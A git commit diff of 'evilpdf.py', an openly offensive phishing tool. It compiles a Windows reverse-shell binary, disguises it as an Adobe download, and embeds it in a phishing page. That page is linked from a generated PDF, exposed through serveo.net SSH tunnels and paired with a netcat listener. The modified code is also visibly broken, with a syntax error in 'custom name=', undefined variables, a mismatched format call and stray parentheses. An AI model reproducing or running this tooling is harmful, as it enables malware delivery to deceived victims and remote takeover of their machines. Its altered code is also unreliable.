78943dc15120f960d39c6fb263cc5c428796e9bd
dm1835504 <70525200+dm1835504@users.noreply.github.com>
2020-09-08 23:20:51 +0200

    Add files via upload

--- evilpdf.py
+++ evilpdf.py
@@ -1,12 +1,11 @@
 #!/bin/bash
-# EvilPDF v2.0
-# coded by: @linux_choice
-# modified by : ghosthub (b@b@y)
-# 
+# EvilPDF v1.0
+# github.com/marrocamp/evilpdf
+# modef by T1T4N1UM
+
 
 import os, time, signal, sys
 from random import randint
-
 from PyPDF2 import PdfFileWriter, PdfFileReader
 
 
@@ -27,13 +26,15 @@ def dependencies():
 
 
 def shutdown(signal,frame):
+   
   print ("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Exiting...\033[0m\n")
   os.system('killall -9 php > /dev/null 2>&1')
   os.system('killall -9 ssh > /dev/null 2>&1')
+  os.system("rm -rf page.html index,html")
   sys.exit()
 signal.signal(signal.SIGINT, shutdown)
 
-def create_pdf(url,pdf_name):
+def create_pdf(url,pdf_name,payload_name):
 
  print ("\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Generating PDF file...\033[0m\n")
  time.sleep(2)
@@ -80,28 +81,20 @@ def banner():
  print( " \033[1;77m |        \\\\   /|  |  |_|    |    |    `   \|     \    \033[0m")
  print( " \033[1;77m/_______  / \_/ |__|____/____|   /_______  /\___  /    \033[0m")
  print( " \033[1;77m        \/                               \/     \/     \033[0m")
- print( " \033[1;77mv2.0 modified by ~ Ghosthub\n")
- print( " \033[1;77mgithub.com/Ba-hub/evilpdf\033[0m\n")
-
-
-def server(subdomain_resp,subdomain,default_port1):
-
-
+ print( " \033[1;77mv1.0 coded by @linux_choice\n")
+ print( " \033[1;77mgithub.com/marrocamp/evilpdf\033[0m\n")
+ 
+def server(subdomain_resp,subdomain,paylod_port):
  print ("\033[1;77m[\033[0m\033[1;93m+\033[0m\033[1;77m] Starting Serveo...\033[0m\n")
-
  os.system('killall -2 php > /dev/null 2>&1')
  os.system('killall -9 ssh > /dev/null 2>&1')
-
-
  if subdomain_resp == True:
-
     os.system("$(which sh) -c \'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R \'%s\':80:localhost:3333 serveo.net -R \'%s\':localhost:4444 2> /dev/null > sendlink ' &" % (subdomain,default_port1))
-    print( "\033[1;77m[\033[0m\033[1;31m+\033[0m\033[1;77m]\033[0m\033[1;31m TCP Forwarding:\033[0m\033[1;77m serveo.net:{}/\033[0m\n").format(default_port1)
+    print( "\033[1;77m[\033[0m\033[1;31m+\033[0m\033[1;77m]\033[0m\033[1;31m TCP Forwarding:\033[0m\033[1;77m serveo.net:{}/\033[0m\n").format(paylod_port)
     time.sleep(8)
  else:
     os.system("$(which sh) -c \'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net -R \'%s\':localhost:4444 2> /dev/null > sendlink \' &" % (default_port1))
     print( "\033[1;77m[\033[0m\033[1;31m+\033[0m\033[1;77m]\033[0m\033[1;31m TCP Forwarding:\033[0m\033[1;77m serveo.net:{}/\033[0m\n").format(default_port1)
-
  print( "\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Starting php server... (localhost:3333)\033[0m\n")
  os.system("fuser -k 3333/tcp > /dev/null 2>&1")
  os.system("php -S localhost:3333 > /dev/null 2>&1 &")
@@ -111,56 +104,52 @@ def server(subdomain_resp,subdomain,default_port1):
  print( '\n\033[1;93m[\033[0m\033[1;77m+\033[0m\033[1;93m] Obfuscation URL use bitly.com (insert above link without https)\033[0m\n')
 
 
-
 def listener():
-
   print( "\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Listening connection:\033[0m\n")
   os.system("fuser -k 4444/tcp > /dev/null 2>&1")
   os.system("nc -lvp 4444")
+ 
+ 
+def payload(payload_name,pdf_name,url):
 
-
-def payload(payload_name,pdf_name,url,default_port1):
-
+ if custom_file==False:
  print( "\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Building malware binary\033[0m\n")
  time.sleep(2)
- os.system("sed 's+serveo_port+'%s'+g'  source.c > rs.c" % (default_port1))
- os.system("i686-w64-mingw32-gcc rs.c -o %s.exe" % payload_name)
- os.system('zip %s.zip %s.exe > /dev/null 2>&1' % (payload_name,payload_name))
+ os.system("sed 's+serveo_port+'%s'+g'  source.c > rs.c" % (paylod_port,payload_server))
+ os.system("i686-w64-mingw32-gcc rs.c -o %s" % payload_name)
+ os.system("rm -rf rs.c")
  print ("\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Converting malware binary to base64\033[0m\n")
  time.sleep(2)
- os.system('base64 -w 0 %s.zip > b64' % (payload_name))
+ os.system('base64 -w 0 %s > b64' % (payload_name))
+ else:
+
+     custom name=os.path.basename(payload_name).rsplit(".")[0]
+     print ("\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Building malware binary\033[0m\n")
+     time.sleep(2)
+     os.system('base64 -w 0 %s > b64' % payload_name))
  with open ("b64", 'r') as get_b64:
    data=get_b64.read().strip()
-
  print( "\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Injecting Data URI (base64) code into page.html\033[0m\n")
  time.sleep(2)
- os.system("sed 's+url_website+'%s'+g' template.html | sed 's+payload_name+'%s'+g'  > page.html" % (url,payload_name))
-
+ os.system("sed 's+url_website+'%s'+g' template.html | sed 's+payload_name+'%s'+g'  > page.html" % (url,os.path.basename(payload_name)))
  f = open("page.html", 'r')
  filedata = f.read()
  f.close()
  newdata = filedata.replace("data_base64", "%s" % (data))
-
  f=open("page.html", 'w')
  f.write(newdata)
  f.close()
  create_pdf(url,pdf_name)
-
-
+ 
 def start():
-
  pdf_default="adobe.pdf"
  pdf_name=input('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] PDF path (Default:\033[0m\033[1;77m %s \033[0m\033[1;33m): \033[0m' % (pdf_default))
  exists = os.path.isfile(pdf_name)
-
  if pdf_name == "":
    pdf_name=pdf_default
-
  elif not exists:
   print('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] File Not Found! \033[0m')
   sys.exit()
-
-
  name_default="getadobe"
  payload_name=input('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] Exe file name (Default:\033[0m\033[1;77m %s \033[0m\033[1;33m): \033[0m' % (name_default))
  if payload_name == "":
@@ -169,16 +158,12 @@ def start():
  url=input('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] Phishing URL (Default:\033[0m\033[1;77m %s \033[0m\033[1;33m): \033[0m' % (url_default))
  if url == "":
    url=url_default
- default_port=randint(1000,65000)
- default_port1=input('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] Serveo (Forwarding) Port (Default:\033[0m\033[1;77m %d \033[0m\033[1;33m): \033[0m' % (default_port))
- if default_port1 == '':
+ paylod_port=randint(4444 , 6500)
+ paylod_port=input('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] Serveo (Forwarding) Port (Default:\033[0m\033[1;77m %d \033[0m\033[1;33m): \033[0m' % (default_port))
+ if paylod_port == '':
    default_port1=default_port
-
  choose_sub=input('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] Choose subdomain? \033[0m\033[1;77m [Y/n] \033[0m\033[1;33m: \033[0m')
-
-
  if choose_sub in "Yy":
-
    subdomain_resp=True
    default_subdomain="getadobe"+str(randint(100,400))
    subdomain=input('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] Subdomain: (Default:\033[0m\033[1;77m %s \033[0m\033[1;33m): \033[0m' % (default_subdomain))
@@ -188,11 +173,9 @@ def start():
  else:
     subdomain_resp=False
     subdomain=""
- payload(payload_name,pdf_name,url,default_port1)
- server(subdomain_resp,subdomain,default_port1)
+ payload(payload_name,pdf_name,url,paylod_port)
+ server(subdomain_resp,subdomain,paylod_port)
  listener()
-
 banner()
 dependencies()
 start()
-
